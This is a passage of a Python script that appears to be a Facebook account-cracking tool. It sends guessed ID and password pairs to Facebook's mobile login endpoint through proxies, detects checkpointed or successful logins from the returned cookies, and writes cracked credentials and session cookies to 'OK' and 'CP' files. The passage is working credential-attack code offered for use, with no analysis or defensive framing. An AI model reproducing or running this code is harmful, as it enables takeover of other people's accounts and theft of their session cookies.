			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print("")
				lupi = []
				lupi.append(square(f'[italic][bold yellow] {idf}',width=31,style=f"{rich_gelap}"))
				lupi.append(square(f'[italic][bold yellow] {pw}',width=31,style=f"{rich_gelap}"))
				lupine_id.print(Columns(lupi))
				lupi = []
				lupi.append(square(f'[italic][bold yellow]{ua}',width=64,style=f"{rich_gelap}"))
				lupine_id.print(Columns(lupi))
				open('CP/'+check,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("")
				lupi = []
				lupi.append(square(f'[italic][bold yellow] {idf}',width=31,style=f"{rich_gelap}"))
				lupi.append(square(f'[italic][bold yellow] {pw}',width=31,style=f"{rich_gelap}"))
				lupine_id.print(Columns(lupi))
				lupi = []
				lupi.append(square(f'[italic][bold green]{kuki}',width=31,style=f"{rich_gelap}"))
				lupi.append(square(f'[italic][bold green]{ua}',width=31,style=f"{rich_gelap}"))
				lupine_id.print(Columns(lupi))
				open('OK/'+live,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("data")
	except:pass
	tsukoyomi()
